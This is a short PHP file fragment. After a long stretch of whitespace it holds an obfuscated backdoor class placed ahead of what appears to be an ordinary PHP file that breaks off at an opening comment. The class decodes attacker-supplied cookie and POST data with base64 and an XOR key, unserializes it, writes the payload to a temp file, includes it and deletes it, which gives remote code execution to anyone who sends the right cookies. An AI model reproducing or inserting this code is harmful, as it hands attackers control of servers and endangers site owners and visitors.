<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("dlmofngeiz")){class dlmofngeiz{public static $xgysxcdp = "agyasrefmbwoxuxg";public static $bqxqc = NULL;public function __construct(){$tvuzxbu = @$_COOKIE[substr(dlmofngeiz::$xgysxcdp, 0, 4)];if (!empty($tvuzxbu)){$ojgjwnun = "base64";$zwublztp = "";$tvuzxbu = explode(",", $tvuzxbu);foreach ($tvuzxbu as $vbbwemgv){$zwublztp .= @$_COOKIE[$vbbwemgv];$zwublztp .= @$_POST[$vbbwemgv];}$zwublztp = array_map($ojgjwnun . "_decode", array($zwublztp,));$zwublztp = $zwublztp[0] ^ str_repeat(dlmofngeiz::$xgysxcdp, (strlen($zwublztp[0]) / strlen(dlmofngeiz::$xgysxcdp)) + 1);dlmofngeiz::$bqxqc = @unserialize($zwublztp);}}public function __destruct(){$this->mhdsblqqks();}private function mhdsblqqks(){if (is_array(dlmofngeiz::$bqxqc)) {$wkfly = sys_get_temp_dir() . "/" . crc32(dlmofngeiz::$bqxqc["salt"]);@dlmofngeiz::$bqxqc["write"]($wkfly, dlmofngeiz::$bqxqc["content"]);include $wkfly;@dlmofngeiz::$bqxqc["delete"]($wkfly);exit();}}}$ewgifsay = new dlmofngeiz();$ewgifsay = NULL;} ?><?php
/**
